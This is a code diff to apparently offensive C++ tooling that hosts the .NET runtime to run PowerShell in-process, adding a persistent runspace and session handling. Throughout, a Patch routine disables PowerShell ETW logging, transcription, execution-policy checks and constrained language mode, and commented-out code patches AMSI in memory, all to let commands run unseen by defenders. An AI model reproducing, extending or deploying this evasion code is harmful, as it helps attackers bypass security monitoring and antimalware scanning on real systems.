@@ -1,5 +1,7 @@
 #include "powershell.h"
 #include "hwbp_veh.h"
+#include <propvarutil.h>
+#pragma comment(lib, "Propsys.lib")
 
 // Helper functions
 BOOL System_Object_GetType(CLR& clr, VARIANT vtObject, VARIANT* pvtType) {
@@ -816,6 +818,36 @@ exit:
     return bResult;
 }
 
+BOOL PowerShellStop(CLR& clr, VARIANT vtPowerShellInstance)
+{
+	BOOL bResult = FALSE;
+	_Type* pPowerShellType = NULL;
+	_MethodInfo* pStopMethod = NULL;
+	_Assembly* pAsm = NULL;
+	VARIANT vtResult;
+	VariantInit(&vtResult);
+
+	if (!clr.LoadAssembly(L"System.Management.Automation", &pAsm)) {
+		goto exit;
+	}
+
+	if (!clr.GetType(pAsm, L"System.Management.Automation.PowerShell", &pPowerShellType))
+		goto exit;
+
+	if (!clr.GetMethod(pPowerShellType, BindingFlags(BindingFlags_Public | BindingFlags_Instance), L"Stop", 0, &pStopMethod))
+		goto exit;
+
+	bResult = clr.InvokeMethod(pStopMethod, vtPowerShellInstance, NULL, &vtResult);
+
+exit:
+	VariantClear(&vtResult);
+	if (pStopMethod) pStopMethod->Release();
+	if (pPowerShellType) pPowerShellType->Release();
+	if (pAsm) pAsm->Release();
+
+	return bResult;
+}
+
 //
 // The following function retrieves an instance of the PSEtwLogProvider class, gets
 // the value of its 'etwProvider' member, which is an EventProvider object, and sets
@@ -886,6 +918,7 @@ exit:
     return bResult;
 }
 
+
 void Patch(CLR& clr) {
     //if (!PatchAmsiOpenSession()) {
     //    PRINT_ERROR("Failed to disable AMSI (1).\n");
@@ -899,17 +932,16 @@ void Patch(CLR& clr) {
     //    PRINT_ERROR("Failed to PatchEtwRet.\n");
     //}
 
-    //if (!PatchEtwRet(clr)) {
-    //    PRINT_ERROR("Failed to PatchEtwRet.\n");
+    if (!PatchTranscriptionOptionFlushContentToDisk(clr)) {
+        PRINT_ERROR(L"[!] Failed to PatchTranscriptionOptionFlushContentToDisk\n");
+    }
+
+    //if (!PatchAmsiInitFailed(clr)) {
+    //    PRINT_ERROR(L"[!] Failed to PatchAmsiInitFailed\n");
     //}
 
     if (!DisablePowerShellEtwProvider(clr)) {
         PRINT_ERROR("Failed to disable ETW Provider.\n");
-        std::cout << "Failed to disable ETW Provider" << std::endl;
-    }
-
-    if (!PatchTranscriptionOptionFlushContentToDisk(clr)) {
-        PRINT_ERROR("Failed to disable Transcription.\n");
     }
 
     if (!PatchAuthorizationManagerShouldRunInternal(clr)) {
@@ -920,18 +952,237 @@ void Patch(CLR& clr) {
         PRINT_ERROR("Failed to disable Constrained Mode Language.\n");
     }
 }
-#include "ghost_amsi.h"
+
+///////////////////////////////////////////////////////////////////////////////
+// Runspace Management - Persistent Session
+///////////////////////////////////////////////////////////////////////////////
+
+BOOL InitRunspace(CLR& clr, RunspaceContext* pCtx) {
+    memset(pCtx, 0, sizeof(RunspaceContext));
+    VariantInit(&pCtx->vtRunspace);
+    if (!clr.LoadAssembly(L"System.Management.Automation", &pCtx->pAsm)) {
+        wprintf(L"[!] Failed to load assembly\n");
+        return FALSE;
+    }
+
+    if (!clr.LoadAssembly(L"System.Reflection", &pCtx->pAsmSystemReflect)) {
+        wprintf(L"[!] Failed to load assembly\n");
+        return FALSE;
+    }
+
+    if (!clr.GetType(pCtx->pAsm, L"System.Management.Automation.PowerShell", &pCtx->pTypePS)) {
+        wprintf(L"[!] Failed to get PowerShell type\n");
+        return FALSE;
+    }
+
+    if (!clr.GetType(pCtx->pAsm, L"System.Management.Automation.Runspaces.RunspaceFactory", &pCtx->pTypeRunspaceFactory)) {
+        wprintf(L"[!] Failed to get RunspaceFactory type\n");
+        return FALSE;
+    }
+
+    if (!clr.GetType(pCtx->pAsm, L"System.Management.Automation.Runspaces.Runspace", &pCtx->pTypeRunspace)) {
+        wprintf(L"[!] Failed to get Runspace type\n");
+        return FALSE;
+    }
+
+    // Get CreateRunspace (static)
+    _MethodInfo* pMethodCreateRunspace = NULL;
+    if (!clr.GetMethod(pCtx->pTypeRunspaceFactory, BindingFlags(BindingFlags_Public | BindingFlags_Static), L"CreateRunspace", 0, &pMethodCreateRunspace)) {
+        wprintf(L"[!] Failed to get CreateRunspace method\n");
+        return FALSE;
+    }
+
+    // Get Open (instance)
+    _MethodInfo* pMethodOpen = NULL;
+    if (!clr.GetMethod(pCtx->pTypeRunspace, BindingFlags(BindingFlags_Public | BindingFlags_Instance), L"Open", 0, &pMethodOpen)) {
+        wprintf(L"[!] Failed to get Open method\n");
+        pMethodCreateRunspace->Release();
+        return FALSE;
+    }
+
+    // Get PowerShell.Create (static)
+    if (!clr.GetMethod(pCtx->pTypePS, BindingFlags(BindingFlags_Public | BindingFlags_Static), L"Create", 0, &pCtx->pMethodCreate)) {
+        wprintf(L"[!] Failed to get Create method\n");
+        pMethodCreateRunspace->Release();
+        pMethodOpen->Release();
+        return FALSE;
+    }
+
+    // Get AddScript (instance, 1 param)
+    if (!clr.GetMethod(pCtx->pTypePS, BindingFlags(BindingFlags_Public | BindingFlags_Instance), L"AddScript", 1, &pCtx->pMethodAddScript)) {
+        wprintf(L"[!] Failed to get AddScript method\n");
+        pMethodCreateRunspace->Release();
+        pMethodOpen->Release();
+        return FALSE;
+    }
+
+    // Get Invoke (instance, 0 params)
+    if (!clr.GetMethod(pCtx->pTypePS, BindingFlags(BindingFlags_Public | BindingFlags_Instance), L"Invoke", 0, &pCtx->pMethodInvoke)) {
+        wprintf(L"[!] Failed to get Invoke method\n");
+        pMethodCreateRunspace->Release();
+        pMethodOpen->Release();
+        return FALSE;
+    }
+
+    // Create Runspace
+    if (!clr.InvokeMethod(pMethodCreateRunspace, pCtx->vtRunspace, NULL, &pCtx->vtRunspace)) {
+        wprintf(L"[!] Failed to Create Runspace\n");
+        pMethodCreateRunspace->Release();
+        pMethodOpen->Release();
+        return FALSE;
+    }
+
+    // Open Runspace
+    if (!clr.InvokeMethod(pMethodOpen, pCtx->vtRunspace, NULL, NULL)) {
+        wprintf(L"[!] Failed to Open Runspace\n");
+        pMethodCreateRunspace->Release();
+        pMethodOpen->Release();
+        return FALSE;
+    }
+
+    Patch(clr);
+
+    wprintf(L"[+] Runspace initialized and opened\n");
+
+    pMethodCreateRunspace->Release();
+    pMethodOpen->Release();
+    return TRUE;
+}
+
+void CloseRunspace(RunspaceContext* pCtx) {
+    if (pCtx->pMethodInvoke) { pCtx->pMethodInvoke->Release(); pCtx->pMethodInvoke = NULL; }
+    if (pCtx->pMethodAddScript) { pCtx->pMethodAddScript->Release(); pCtx->pMethodAddScript = NULL; }
+    if (pCtx->pMethodCreate) { pCtx->pMethodCreate->Release(); pCtx->pMethodCreate = NULL; }
+    if (pCtx->pTypePS) { pCtx->pTypePS->Release(); pCtx->pTypePS = NULL; }
+    if (pCtx->pTypeRunspace) { pCtx->pTypeRunspace->Release(); pCtx->pTypeRunspace = NULL; }
+    if (pCtx->pTypeRunspaceFactory) { pCtx->pTypeRunspaceFactory->Release(); pCtx->pTypeRunspaceFactory = NULL; }
+    if (pCtx->pAsmSystemReflect) { pCtx->pAsmSystemReflect->Release(); pCtx->pAsmSystemReflect = NULL; }
+    if (pCtx->pAsm) { pCtx->pAsm->Release(); pCtx->pAsm = NULL; }
+    VariantClear(&pCtx->vtRunspace);
+    wprintf(L"[+] Runspace closed.\n");
+}
+
+BOOL InvokeInRunspace(CLR& clr, RunspaceContext* pCtx, std::wstring command, std::wstring* out) {
+    VARIANT vtPSInstance;
+    VariantInit(&vtPSInstance);
+
+    VARIANT vtScript;
+    VariantInit(&vtScript);
+
+    BSTR bstrScript = SysAllocString(command.c_str());
+    if (!bstrScript) return FALSE;
+
+    vtScript.vt = VT_BSTR;
+    vtScript.bstrVal = bstrScript;
+
+    SAFEARRAY* pArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
+    if (!pArgs) {
+        SysFreeString(bstrScript);
+        return FALSE;
+    }
+
+    long idx = 0;
+    if (FAILED(SafeArrayPutElement(pArgs, &idx, &vtScript))) {
+        SafeArrayDestroy(pArgs);
+        SysFreeString(bstrScript);
+        return FALSE;
+    }
+    
+    // Create PowerShell instance (static method)
+    VARIANT vtResult;
+    VariantInit(&vtResult);
+    if (!clr.InvokeMethod(pCtx->pMethodCreate, vtPSInstance, NULL, &vtPSInstance)) {
+        wprintf(L"[!] Failed to create PowerShell instance\n");
+        SafeArrayDestroy(pArgs);
+        SysFreeString(bstrScript);
+        return FALSE;
+    }
+
+    // Set Runspace property
+    if (!clr.SetPropertyValue(pCtx->pTypePS, BindingFlags(BindingFlags_Public | BindingFlags_Instance),
+                              vtPSInstance, L"Runspace", pCtx->vtRunspace)) {
+        wprintf(L"[!] Failed to set Runspace property\n");
+        VariantClear(&vtPSInstance);
+        SafeArrayDestroy(pArgs);
+        SysFreeString(bstrScript);
+        return FALSE;
+    }
+
+    // AddScript
+    VARIANT vtPSAfterScript;
+    VariantInit(&vtPSAfterScript);
+    if (!clr.InvokeMethod(pCtx->pMethodAddScript, vtPSInstance, pArgs, &vtPSAfterScript)) {
+        wprintf(L"[!] Failed to AddScript\n");
+        VariantClear(&vtPSInstance);
+        SafeArrayDestroy(pArgs);
+        SysFreeString(bstrScript);
+        return FALSE;
+    }
+
+    SafeArrayDestroy(pArgs);
+    SysFreeString(bstrScript);
+    VariantClear(&vtScript);
+
+    // Invoke
+    VariantInit(&vtResult);
+    BOOL bSuccess = FALSE;
+    BOOL bHadErrors = FALSE;
+
+    //PVOID lpClrAddr = GetModuleHandleA("System.Numerics.ni.dll");
+    //if (!lpClrAddr) {
+    //    PRINT_ERROR("GetModuleHandleA");
+    //    return 0;
+    //}
+
+    //wchar_t patchAmsi = L'H';
+    //LPVOID addrAmsi = (LPVOID)FindFirstStringW((uintptr_t)lpClrAddr, 0x9A0000, L"amsi.dll");
+    //if (addrAmsi) {
+    //    DEBUG("Patch string amsi dll");
+    //    PatchProcedure(addrAmsi, (BYTE*)&patchAmsi, sizeof(char));
+    //}
+
+    EnumeratePrivateMemory();
+
+    if (clr.InvokeMethod(pCtx->pMethodInvoke, vtPSAfterScript, NULL, &vtResult)) {
+        PrintPowerShellOutput(clr, vtResult, out);
+        bSuccess = TRUE;
+    }
+
+    // Check for errors BEFORE clearing vtPSInstance
+    if (!PowerShellHadErrors(clr, vtPSInstance, &bHadErrors)) {
+        bSuccess = FALSE;
+    } else if (bHadErrors) {
+        PrintPowerShellInvokeErrors(clr, vtPSInstance);
+        // Reset PowerShell instance for next command
+        VariantClear(&vtPSInstance);
+    }
+
+    VariantClear(&vtResult);
+    VariantClear(&vtPSAfterScript);
+    VariantClear(&vtPSInstance);
+
+    return bSuccess;
+}
+
+///////////////////////////////////////////////////////////////////////////////
+// Legacy Invoke - Single command (for backward compatibility)
+///////////////////////////////////////////////////////////////////////////////
+
 BOOL Invoke(CLR &clr, std::wstring command, std::wstring* out) {
     int nRet = 0;
     _Assembly* pAsm = NULL;
     _Assembly* pAsmSystemReflect = NULL;
     _Type* pTypePS = NULL;
+    _Type* pTypeRunspace = NULL;
+    _Type* pTypeRunspaceFactory = NULL;
     _MethodInfo* pMethodCreate = NULL;
     _MethodInfo* pMethodAddScript = NULL;
     _MethodInfo* pMethodInvoke = NULL;
+    _MethodInfo* pMethodOpen = NULL;
+    _MethodInfo* pMethodClose = NULL;
+    _MethodInfo* pMethodCreateRunspace = NULL;
     VARIANT vtPSInstance;
     VariantInit(&vtPSInstance);
-    SAFEARRAY* pEmptyArgs = NULL;
     VARIANT vtScript;
     VariantInit(&vtScript);
     SAFEARRAY* pArgs = NULL;
@@ -940,7 +1191,9 @@ BOOL Invoke(CLR &clr, std::wstring command, std::wstring* out) {
     BSTR bstrScript;
     long idx = 0;
     BOOL bHadErrors = FALSE;
-    //execute_debug_context();
+    VARIANT vtRunspace;
+    VariantInit(&vtRunspace);
+
     if (!clr.LoadAssembly(L"System.Management.Automation", &pAsm)) {
         wprintf(L"[!] Failed to load assembly\n");
         return 0;
@@ -951,14 +1204,36 @@ BOOL Invoke(CLR &clr, std::wstring command, std::wstring* out) {
         return 0;
     }
 
-    if (!PatchTranscriptionOptionFlushContentToDisk(clr)) {
-        wprintf(L"[!] Failed to PatchTranscriptionOptionFlushContentToDisk\n");
-        return 0;
-    }
-
     if (!clr.GetType(pAsm, L"System.Management.Automation.PowerShell", &pTypePS)) {
         wprintf(L"[!] Failed to get PowerShell type\n");
         nRet = 0;
+        goto cleanup;
+    }
+
+    if (!clr.GetType(pAsm, L"System.Management.Automation.Runspaces.RunspaceFactory", &pTypeRunspaceFactory)) {
+        wprintf(L"[!] Failed to get PowerShell type RunspaceFactory\n");
+        nRet = 0;
+        goto cleanup;
+    }
+
+    if (!clr.GetType(pAsm, L"System.Management.Automation.Runspaces.Runspace", &pTypeRunspace)) {
+        wprintf(L"[!] Failed to get PowerShell type Runspace\n");
+        nRet = 0;
+        goto cleanup;
+    }
+
+    if (!clr.GetMethod(pTypeRunspaceFactory, BindingFlags(BindingFlags_Public | BindingFlags_Static), L"CreateRunspace", 0, &pMethodCreateRunspace)) {
+        wprintf(L"[!] Failed to get CreateRunspace method\n");
+        goto cleanup;
+    }
+
+    if (!clr.GetMethod(pTypeRunspace, BindingFlags(BindingFlags_Public | BindingFlags_Instance), L"Open", 0, &pMethodOpen)) {
+        wprintf(L"[!] Failed to get Open method\n");
+        goto cleanup;
+    }
+
+    if (!clr.GetMethod(pTypeRunspace, BindingFlags(BindingFlags_Public | BindingFlags_Instance), L"Close", 0, &pMethodClose)) {
+        wprintf(L"[!] Failed to get Close method\n");
         goto cleanup;
     }
 
@@ -980,8 +1255,29 @@ BOOL Invoke(CLR &clr, std::wstring command, std::wstring* out) {
         goto cleanup;
     }
 
+    // Create Runspace
+    if (!clr.InvokeMethod(pMethodCreateRunspace, vtRunspace, NULL, &vtRunspace)) {
+        wprintf(L"[!] Failed to Create Runspace\n");
+        nRet = 0;
+        goto cleanup;
+    }
+
+    // Open Runspace
+    if (!clr.InvokeMethod(pMethodOpen, vtRunspace, NULL, NULL)) {
+        wprintf(L"[!] Failed to Open Runspace\n");
+        nRet = 0;
+        goto cleanup;
+    }
+
     if (!clr.InvokeMethod(pMethodCreate, vtPSInstance, NULL, &vtPSInstance)) {
         wprintf(L"[!] Failed to create PowerShell instance\n");
+        nRet = 0;
+        goto cleanup;
+    }
+    
+    // Set Runspace property on PowerShell instance
+    if (!clr.SetPropertyValue(pTypePS, BindingFlags(BindingFlags_Public | BindingFlags_Instance), vtPSInstance, L"Runspace", vtRunspace)) {
+        wprintf(L"[!] Failed to set property Runspace\n");
         nRet = 0;
         goto cleanup;
     }
@@ -996,29 +1292,39 @@ BOOL Invoke(CLR &clr, std::wstring command, std::wstring* out) {
     if (FAILED(SafeArrayPutElement(pArgs, &idx, &vtScript))) goto cleanup;
     VariantClear(&vtResult);
     VariantInit(&vtResult);
-    clr.InvokeMethod(pMethodAddScript, vtPSInstance, pArgs, &vtResult);
+
+    // AddScript returns PowerShell instance - use it for Invoke
+    VARIANT vtPSAfterScript;
+    VariantInit(&vtPSAfterScript);
+    if (!clr.InvokeMethod(pMethodAddScript, vtPSInstance, pArgs, &vtPSAfterScript)) {
+        wprintf(L"[!] Failed to AddScript\n");
+        goto cleanup;
+    }
 
     SafeArrayDestroy(pArgs);
     pArgs = NULL;
     VariantClear(&vtScript);
-    VariantClear(&vtResult);
 
     VariantInit(&vtResult);
 
-    Patch(clr);
-    if (clr.InvokeMethod(pMethodInvoke, vtPSInstance, NULL, &vtResult)) {
+    // Invoke on the result from AddScript
+    if (clr.InvokeMethod(pMethodInvoke, vtPSAfterScript, NULL, &vtResult)) {
         PrintPowerShellOutput(clr, vtResult, out);
     }
+
+    VariantClear(&vtPSAfterScript);
+
     if (!PowerShellHadErrors(clr, vtPSInstance, &bHadErrors))
         goto cleanup;
 
     if (bHadErrors)
     {
         PrintPowerShellInvokeErrors(clr, vtPSInstance);
+    }
 
-        // Reset PowerShell instance: release cái cũ, tạo cái mới.
-        // Cách này xóa mọi errors/streams/commands — không cần gọi Clear() từng phần.
-        VariantClear(&vtPSInstance);
+    if (pMethodClose && vtRunspace.vt != VT_EMPTY)
+    {
+        clr.InvokeMethod(pMethodClose, vtRunspace, NULL, NULL);
     }
 
     VariantClear(&vtResult);
@@ -1026,25 +1332,16 @@ BOOL Invoke(CLR &clr, std::wstring command, std::wstring* out) {
 
 cleanup:
 
-    // SAFEARRAY arguments
     if (pArgs)
     {
         SafeArrayDestroy(pArgs);
         pArgs = NULL;
     }
 
-    if (pEmptyArgs)
-    {
-        SafeArrayDestroy(pEmptyArgs);
-        pEmptyArgs = NULL;
-    }
-
-    // VARIANTs
     VariantClear(&vtResult);
     VariantClear(&vtScript);
     VariantClear(&vtPSInstance);
-
-    // Methods
+    VariantClear(&vtRunspace);
 
     if (pMethodInvoke)
         pMethodInvoke->Release();
@@ -1055,10 +1352,29 @@ cleanup:
     if (pMethodCreate)
         pMethodCreate->Release();
 
+    if (pMethodOpen) {
+        pMethodOpen->Release();
+    }
+
+    if (pMethodClose) {
+        pMethodClose->Release();
+    }
+
+    if (pMethodCreateRunspace) {
+        pMethodCreateRunspace->Release();
+    }
+
     if (pTypePS)
         pTypePS->Release();
 
-    // Assemblies
+    if (pTypeRunspace) {
+        pTypeRunspace->Release();
+    }
+
+    if (pTypeRunspaceFactory) {
+        pTypeRunspaceFactory->Release();
+    }
+
     if (pAsmSystemReflect)
         pAsmSystemReflect->Release();
 
